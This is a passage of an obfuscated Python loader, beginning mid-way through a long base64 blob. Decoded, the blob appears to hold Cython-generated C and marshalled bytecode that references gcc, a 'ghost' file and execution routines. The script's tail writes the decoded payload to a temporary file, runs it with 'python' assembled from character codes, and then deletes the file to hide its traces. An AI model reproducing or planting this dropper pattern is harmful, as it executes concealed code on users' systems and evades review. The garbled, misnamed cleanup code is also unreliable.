ZiBfX0ZyZWVCU0RfX1xuICAgIGZwX2V4Y2VwdF90IG07XG4gICAgbSA9IGZwZ2V0bWFzaygpO1xuICAgIGZwc2V0bWFzayhtICYgfkZQX1hfT0ZMKTtcbiNlbmRpZlxuICAgIGlmIChhcmdjICYmIGFyZ3YpXG4gICAgICAgIFB5X1NldFByb2dyYW1OYW1lKGFyZ3ZbMF0pO1xuICAgIFB5X0luaXRpYWxpemUoKTtcbiAgICBpZiAoYXJnYyAmJiBhcmd2KVxuICAgICAgICBQeVN5c19TZXRBcmd2KGFyZ2MsIGFyZ3YpO1xuICAgIHtcbiAgICAgIFB5T2JqZWN0KiBtID0gTlVMTDtcbiAgICAgIF9fcHl4X21vZHVsZV9pc19tYWluX29wID0gMTtcbiAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgM1xuICAgICAgICAgIGluaXRvcCgpO1xuICAgICAgI2VsaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgICAgICAgbSA9IFB5SW5pdF9vcCgpO1xuICAgICAgICAgIGlmICghUHlNb2R1bGVfQ2hlY2sobSkpIHtcbiAgICAgICAgICAgICAgUHlNb2R1bGVEZWYgKm1kZWYgPSAoUHlNb2R1bGVEZWYgKikgbTtcbiAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZG5hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygiX19tYWluX18iKTtcbiAgICAgICAgICAgICAgbSA9IE5VTEw7XG4gICAgICAgICAgICAgIGlmIChtb2RuYW1lKSB7XG4gICAgICAgICAgICAgICAgICBtID0gUHlNb2R1bGVfTmV3T2JqZWN0KG1vZG5hbWUpO1xuICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKG1vZG5hbWUpO1xuICAgICAgICAgICAgICAgICAgaWYgKG0pIFB5TW9kdWxlX0V4ZWNEZWYobSwgbWRlZik7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICB9XG4gICAgICAjZWxzZVxuICAgICAgICAgIG0gPSBQeUluaXRfb3AoKTtcbiAgICAgICNlbmRpZlxuICAgICAgaWYgKFB5RXJyX09jY3VycmVkKCkpIHtcbiAgICAgICAgICBQeUVycl9QcmludCgpO1xuICAgICAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgM1xuICAgICAgICAgIGlmIChQeV9GbHVzaExpbmUoKSkgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICByZXR1cm4gMTtcbiAgICAgIH1cbiAgICAgIFB5X1hERUNSRUYobSk7XG4gICAgfVxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA2MDAwMFxuICAgIFB5X0ZpbmFsaXplKCk7XG4jZWxzZVxuICAgIGlmIChQeV9GaW5hbGl6ZUV4KCkgPCAwKVxuICAgICAgICByZXR1cm4gMjtcbiNlbmRpZlxuICAgIHJldHVybiAwO1xufVxuI2lmIFBZX01BSk9SX1ZFUlNJT04gPj0gMyAmJiAhZGVmaW5lZChXaW4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUylcbiNpbmNsdWRlIDxsb2NhbGUuaD5cbnN0YXRpYyB3Y2hhcl90KlxuX19QeXhfY2hhcjJ3Y2hhcihjaGFyKiBhcmcpXG57XG4gICAgd2NoYXJfdCAqcmVzO1xuI2lmZGVmIEhBVkVfQlJPS0VOX01CU1RPV0NTXG4gICAgc2l6ZV90IGFyZ3NpemUgPSBzdHJsZW4oYXJnKTtcbiNlbHNlXG4gICAgc2l6ZV90IGFyZ3NpemUgPSBtYnN0b3djcyhOVUxMLCBhcmcsIDApO1xuI2VuZGlmXG4gICAgc2l6ZV90IGNvdW50O1xuICAgIHVuc2lnbmVkIGNoYXIgKmluO1xuICAgIHdjaGFyX3QgKm91dDtcbiNpZmRlZiBIQVZFX01CUlRPV0NcbiAgICBtYnN0YXRlX3QgbWJzO1xuI2VuZGlmXG4gICAgaWYgKGFyZ3NpemUgIT0gKHNpemVfdCktMSkge1xuICAgICAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYygoYXJnc2l6ZSsxKSpzaXplb2Yod2NoYXJfdCkpO1xuICAgICAgICBpZiAoIXJlcylcbiAgICAgICAgICAgIGdvdG8gb29tO1xuICAgICAgICBjb3VudCA9IG1ic3Rvd2NzKHJlcywgYXJnLCBhcmdzaXplKzEpO1xuICAgICAgICBpZiAoY291bnQgIT0gKHNpemVfdCktMSkge1xuICAgICAgICAgICAgd2NoYXJfdCAqdG1wO1xuICAgICAgICAgICAgZm9yICh0bXAgPSByZXM7ICp0bXAgIT0gMCAmJlxuICAgICAgICAgICAgICAgICAgICAgKCp0bXAgPCAweGQ4MDAgfHwgKnRtcCA+IDB4ZGZmZik7IHRtcCsrKVxuICAgICAgICAgICAgICAgIDtcbiAgICAgICAgICAgIGlmICgqdG1wID09IDApXG4gICAgICAgICAgICAgICAgcmV0dXJuIHJlcztcbiAgICAgICAgfVxuICAgICAgICBmcmVlKHJlcyk7XG4gICAgfVxuI2lmZGVmIEhBVkVfTUJSVE9XQ1xuICAgIGFyZ3NpemUgPSBzdHJsZW4oYXJnKSArIDE7XG4gICAgcmVzID0gKHdjaGFyX3QgKiltYWxsb2MoYXJnc2l6ZSpzaXplb2Yod2NoYXJfdCkpO1xuICAgIGlmICghcmVzKSBnb3RvIG9vbTtcbiAgICBpbiA9ICh1bnNpZ25lZCBjaGFyKilhcmc7XG4gICAgb3V0ID0gcmVzO1xuICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTtcbiAgICB3aGlsZSAoYXJnc2l6ZSkge1xuICAgICAgICBzaXplX3QgY29udmVydGVkID0gbWJydG93YyhvdXQsIChjaGFyKilpbiwgYXJnc2l6ZSwgJm1icyk7XG4gICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gMClcbiAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICBpZiAoY29udmVydGVkID09IChzaXplX3QpLTIpIHtcbiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAidW5leHBlY3RlZCBtYnJ0b3djIHJlc3VsdCAtMiIpO1xuICAgICAgICAgICAgZnJlZShyZXMpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAoc2l6ZV90KS0xKSB7XG4gICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKztcbiAgICAgICAgICAgIGFyZ3NpemUtLTtcbiAgICAgICAgICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTtcbiAgICAgICAgICAgIGNvbnRpbnVlO1xuICAgICAgICB9XG4gICAgICAgIGlmICgqb3V0ID49IDB4ZDgwMCAmJiAqb3V0IDw9IDB4ZGZmZikge1xuICAgICAgICAgICAgYXJnc2l6ZSAtPSBjb252ZXJ0ZWQ7XG4gICAgICAgICAgICB3aGlsZSAoY29udmVydGVkLS0pXG4gICAgICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7XG4gICAgICAgICAgICBjb250aW51ZTtcbiAgICAgICAgfVxuICAgICAgICBpbiArPSBjb252ZXJ0ZWQ7XG4gICAgICAgIGFyZ3NpemUgLT0gY29udmVydGVkO1xuICAgICAgICBvdXQrKztcbiAgICB9XG4jZWxzZVxuICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChzdHJsZW4oYXJnKSsxKSpzaXplb2Yod2NoYXJfdCkpO1xuICAgIGlmICghcmVzKSBnb3RvIG9vbTtcbiAgICBpbiA9ICh1bnNpZ25lZCBjaGFyKilhcmc7XG4gICAgb3V0ID0gcmVzO1xuICAgIHdoaWxlKCppbilcbiAgICAgICAgaWYoKmluIDwgMTI4KVxuICAgICAgICAgICAgKm91dCsrID0gKmluKys7XG4gICAgICAgIGVsc2VcbiAgICAgICAgICAgICpvdXQrKyA9IDB4ZGMwMCArICppbisrO1xuICAgICpvdXQgPSAwO1xuI2VuZGlmXG4gICAgcmV0dXJuIHJlcztcbm9vbTpcbiAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbmludFxubWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpXG57XG4gICAgaWYgKCFhcmdjKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9tYWluKDAsIE5VTEwpO1xuICAgIH1cbiAgICBlbHNlIHtcbiAgICAgICAgaW50IGksIHJlcztcbiAgICAgICAgd2NoYXJfdCAqKmFyZ3ZfY29weSA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpO1xuICAgICAgICB3Y2hhcl90ICoqYXJndl9jb3B5MiA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpO1xuICAgICAgICBjaGFyICpvbGRsb2MgPSBzdHJkdXAoc2V0bG9jYWxlKExDX0FMTCwgTlVMTCkpO1xuICAgICAgICBpZiAoIWFyZ3ZfY29weSB8fCAhYXJndl9jb3B5MiB8fCAhb2xkbG9jKSB7XG4gICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTtcbiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5KTtcbiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5Mik7XG4gICAgICAgICAgICBmcmVlKG9sZGxvYyk7XG4gICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICByZXMgPSAwO1xuICAgICAgICBzZXRsb2NhbGUoTENfQUxMLCAiIik7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBhcmdjOyBpKyspIHtcbiAgICAgICAgICAgIGFyZ3ZfY29weTJbaV0gPSBhcmd2X2NvcHlbaV0gPSBfX1B5eF9jaGFyMndjaGFyKGFyZ3ZbaV0pO1xuICAgICAgICAgICAgaWYgKCFhcmd2X2NvcHlbaV0pIHJlcyA9IDE7XG4gICAgICAgIH1cbiAgICAgICAgc2V0bG9jYWxlKExDX0FMTCwgb2xkbG9jKTtcbiAgICAgICAgZnJlZShvbGRsb2MpO1xuICAgICAgICBpZiAocmVzID09IDApXG4gICAgICAgICAgICByZXMgPSBfX1B5eF9tYWluKGFyZ2MsIGFyZ3ZfY29weSk7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBhcmdjOyBpKyspIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwNTAwMDBcbiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5MltpXSk7XG4jZWxzZVxuICAgICAgICAgICAgUHlNZW1fUmF3RnJlZShhcmd2X2NvcHkyW2ldKTtcbiNlbmRpZlxuICAgICAgICB9XG4gICAgICAgIGZyZWUoYXJndl9jb3B5KTtcbiAgICAgICAgZnJlZShhcmd2X2NvcHkyKTtcbiAgICAgICAgcmV0dXJuIHJlcztcbiAgICB9XG59XG4jZW5kaWZcbnpceDA0b3AuY1x4ZmFceDAxLlx4ZmFceDAxIFx4ZTlceGZmXHhmZlx4ZmZceGZmelx4MDZnY2MgLUl6XHgwZi9pbmNsdWRlL3B5dGhvbnpceDA0IC1vIHpceDAzIC1MelxyL2xpYiAtbHB5dGhvblx4ZGFceDAxd1x4ZGFceDAyb3NUKVx4MDFceGRhXHgwOGV4aXN0X29rKTFceGRhXHgwM21hcFx4ZGFceDAzY2hyXHhkYVx4MDFHXHhkYVx4MDFIXHhkYVx4MDFPXHhkYVx4MDFTXHhkYVx4MDFUXHhkYVx4MDFKXHhkYVx4MDFJXHhkYVx4MDJHSFx4ZGFceDAyT1NceGRhXHgwMlRKXHhkYVx4MDJJSVx4ZGFceDA1R0hPU1RceGRhXHgwOHRlbXBmaWxlXHhkYVx4MDF0clx4MTRceDAwXHgwMFx4MDByXG5ceDAwXHgwMFx4MDBceGRhXG5naG9zdF9wYXRoclx4MGJceDAwXHgwMFx4MDBceGRhXHgwNWdyZG12clx4MGNceDAwXHgwMFx4MDBceGRhXHgwNHN0ZW1ceGRhXHgwNmJhc2U2NHJcclx4MDBceDAwXHgwMFx4ZGFceDA0bG1hb1x4ZGFceDA1cHJpbnRceGRhXG5fX2ltcG9ydF9fXHhkYVx4MDZwcmVmaXhceGRhXHgwNlBSRUZJWFx4ZGFceDBjRVhFQ1VURV9GSUxFXHhkYVx4MTFFWFBPUlRfUFlUSE9OSE9NRVx4ZGFcbmV4ZWN1dGFibGVceGRhXHgxOEVYUE9SVF9QWVRIT05fRVhFQ1VUQUJMRVx4ZGFceDAzUlVOXHhkYVx4MDZpc2ZpbGVceGRhXHgwNGV4aXRceGRhXHgwOENfU09VUkNFXHhkYVx4MDZDX0ZJTEVceGRhXHgwNGpvaW5ceGRhXHgwN3ZlcnNpb25ceGRhXHgwNXNwbGl0XHhkYVx4MGVQWVRIT05fVkVSU0lPTlx4ZGFceDBjQ09NUElMRV9GSUxFXHhkYVx4MDRvcGVuXHhkYVx4MDFmXHhkYVx4MDV3cml0ZVx4ZGFceDA4bWFrZWRpcnNceGRhXHgwN2Rpcm5hbWVceGE5XHgwMFx4ZjNceDAwXHgwMFx4MDBceDAwXHhkYVx4MDVnaG9zdFx4ZmFceDA4PG1vZHVsZT5yRVx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBzXHgxYVx4MDNceDAwXHgwMFx4ZjBceDAzXHgwMVx4MDFceDAxXHhkOFx4MTJceDE1XHg5MCNceDkwY1x4ZDBceDFiO1x4ZDBceDFiO1x4ZDBceDFiO1x4ZDFceDEyPFx4ZDRceDEyPFx4ODFceDBmXHg4MFx4MDFceDgwIVx4ODBBXHg4MGFceDg4XHgwMVx4ODghXHg4OEFceDg4YVx4ZDhceDExXHgxMlx4OTAxXHg5MVx4MTNceDkwYVx4OThceDAxXHg5MWNceDk4MVx4OThRXHg5OTNceGEwXHgwMVx4YTAhXHhhMVx4MDNceGQwXHgxMSNceDgxXHgwZVx4ODBceDAyXHg4MEJceDg4XHgwMlx4ODhCXHhkOFx4MDhcdFx4ODghXHg4OVx4MDNceDg4QVx4ODlceDA1XHg4OGFceDg5XHgwN1x4OTBceDAxXHg4OVx0XHg5MCFceDg5XHgwYlx4OTBBXHg4OVxyXHg5MGFceDg5XHgwZlx4ODBceDA1XHhkOFx4MDBceDE0XHhkMFx4MDBceDE0XHhkMFx4MDBceDE0XHhkMFx4MDBceDE0XHhkOFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkMFx4MDBCXHhkOFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhkMFx4MDAkXHhlMFx4MDBceDA1XHg4MFx4MDVceGQwXHgwNilceGQxXHgwMCpceGQ0XHgwMCpceGQwXHgwMCpceGQ4XHgwMFx4MDVceDgwXHgwNVx4ODBiXHg4MVx0XHg4NFx0XHg4MFx0XHhkOFx4MDBceDA1XHg4MFx4MDVceGQwXHgwNkVceGQxXHgwMEZceGQ0XHgwMEZceGQwXHgwMEZceGQ4XHgwMFx4MDVceDgwXHgwNVx4ODBiXHg4MVx0XHg4NFx0XHg4MFx0XHhkOFx4MDdceDExXHg4MHpceDkwJVx4ZDFceDA3XHgxOFx4ZDRceDA3XHgxOFx4ZDRceDA3XHgxZlx4ODBceDA2XHhkOFx4MGZceDFhXHg4MFx4MGNceGQ4XHgxM1wnXHhhOFxuXHhhOFxuXHhiMDVceGQxKDlceGQ0KDlceGQ0KEBceGQxXHgxM0BceGQwXHgwMFx4MTFceGQ4XHgxYTVceGIwelx4YjB6XHhjMCVceGQxN0hceGQ0N0hceGQ0N1NceGQxXHgxYVNceGQwXHgwMFx4MThceGQ4XHgwNlxuXHg4OExceGQxXHgwNlx4MThceDgwXHgwM1x4ZDhceDAzXHgxNFx4ODA6XHhkNFx4MDNceDE0XHg5MFxcXHhkMVx4MDMiXHhkNFx4MDMiXHhmMFx4MDBceDAyXHgwMVx4MGNceGQ4XHgwNFx4MDhceDgwRFx4ZDBcdFx4MWFceDk4RFx4ZDFcdCBceGQwIjpceGQxXHQ6XHhiOERceGQxXHRAXHhjMCNceGQxXHRFXHhkMVx4MDRGXHhkNFx4MDRGXHhkMFx4MDRGXHhkOFx4MDRceDA4XHg4MERceDg4XHgxMVx4ODFHXHg4NEdceDgwR1x4ZjBceDAyT0NceDA1XHgwY1x4MDRceDgwXHgwOFx4ZjBgRlxuXHgwMFx0XHgwZlx4ODBceDA2XHhkOFx4MTFceDE0XHg5N1x4MThceDkyXHgxOFx4OTgqXHg5OCpceGEwVVx4ZDFceDFhK1x4ZDRceDFhK1x4ZDRceDFhM1x4ZDdceDFhOVx4ZDJceDFhOVx4YjgjXHhkMVx4MWE+XHhkNFx4MWE+XHhiOHFceGQ0XHgxYUFceGQ3XHgxYUdceGQyXHgxYUdceGM4XHgwM1x4ZDFceDFhTFx4ZDRceDFhTFx4YzhTXHhjOGJceGM4U1x4ZDRceDFhUVx4ZDFceDExUlx4ZDRceDExUlx4ODBceDBlXHhkOFx4MTBceDE4XHg5ODZceGQxXHgxMCFceGQwJDVceGQxXHgxMDVceGI4XHgwZVx4ZDFceDEwRlx4YzhceDE2XHhkMVx4MTBPXHhkMFJeXHhkMVx4MTBeXHhkMGFkXHhkMVx4MTBkXHhkMGdtXHhkMVx4MTBtXHhkMHB1XHhkMVx4MTB1XHhkMHh+XHhkMVx4MTB+XHhmMFx4MDBceDAwQlx4MDJRXHgwMlx4ZjFceDAwXHgwMFx4MTFRXHgwMlx4ZjBceDAwXHgwMFRceDAyYlx4MDJceGYxXHgwMFx4MDBceDExYlx4MDJceDgwXHgwY1x4ZDhceDA1XHRceDgwVFx4ODgmXHg5MFx4MTNceGQxXHgwNVx4MTVceGQ0XHgwNVx4MTVceGYwXHgwMFx4MDFceDAxXHgxNlx4OThceDExXHhkOFx4MDRceDA1XHg4N0dceDgyR1x4ODhIXHhkMVx4MDRceDE1XHhkNFx4MDRceDE1XHhkMFx4MDRceDE1XHhmMFx4MDNceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMVx4MDBceDAxXHgwMVx4MTZceGY0XHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjhceGY4XHhmOFx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhlMFx4MDBcblx4ODBcblx4ODg0XHhkMVx4MDBceDEwXHhkNFx4MDBceDEwXHhkN1x4MDBceDE5XHhkMlx4MDBceDE5XHhkMFx4MWEsXHg5OCpceGQ0XHgxYSxceGE4XFxceGQxXHgxYTpceGQ0XHgxYTpceGMwRFx4ZDBceDAwXHgxOVx4ZDFceDAwSVx4ZDRceDAwSVx4ZDBceDAwSVx4ZDhceDAwXHgwNFx4ODBceDA0XHhkMFx4MDVceDE2XHg5OFx4MDRceGQxXHgwNVx4MWNceGQwXHgxZTZceGQxXHgwNTZceGI4XHgwNFx4ZDFceDA1PFx4Yjh8XHhkMVx4MDVLXHhjOFRceGQxXHgwNVFceGQwU1ZceGQxXHgwNVZceGQxXHgwMFdceGQ0XHgwMFdceGQwXHgwMFdceGQ4XHgwMFx4MDVceDgwXHgwNVx4ODBmXHg4MVxyXHg4NFxyXHg4MFxyXHg4MFxyXHg4MFxyc1x4MTJceDAwXHgwMFx4MDBceGM1P1x4MTZGIVx4MDNceGM2IVx4MDRGJVx4MDdceGM2KFx4MDFGJVx4MDcnKSk=')
try:
	with t.NamedTemporaryFile(delete=False, suffix='.py') as ghostfile:
		ghostfile.write(lmao(ghostenc))
		ghostpath = ghostfile.name
	stem(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + ghostpath + '"')
except Exception as ghost_err:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(ghost_err)
finally:
	if 'ghostpath' in locals() and ghost_path.exists(ghostpath):
		grdmv(ghostpath)
